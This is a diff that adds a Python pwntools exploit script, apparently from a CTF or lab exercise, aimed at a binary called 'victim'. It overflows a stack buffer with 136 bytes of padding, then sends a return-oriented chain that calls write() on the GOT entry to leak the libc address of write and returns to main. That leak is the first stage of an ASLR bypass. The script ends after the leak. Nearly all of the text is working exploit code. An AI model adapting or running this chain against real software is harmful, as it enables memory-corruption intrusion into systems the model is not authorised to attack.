@@ -1,0 +1,33 @@
+#!/usr/bin/env python
+from pwn import *
+
+libc = ELF('libc.so.6')
+elf = ELF('victim')
+
+p = process('./victim')
+#p = remote('127.0.0.1',10001)
+
+pop_ret_addr=0x00000000004005c3
+pop_pop_pop_ret_addr=0x00000000004004fe
+main_addr = 0x000000000040052a
+
+plt_write = elf.symbols['write']
+print 'plt_write= ' + hex(plt_write)
+got_write = elf.got['write']
+print 'got_write= ' + hex(got_write)
+
+payload1 = 'A'*136
+payload1 += p64(pop_pop_pop_ret_addr)
+payload1 += p64(0x1)
+payload1 += p64(got_write)
+payload1 += p64(0x8)
+payload1 += p64(plt_write)
+payload1 += p64(main_addr)
+
+
+print "\n###sending payload1 ...###"
+p.send(payload1)
+
+print "\n###receving write() addr...###"
+write_addr = u64(p.recv(8))
+print 'write_addr=' + hex(write_addr)
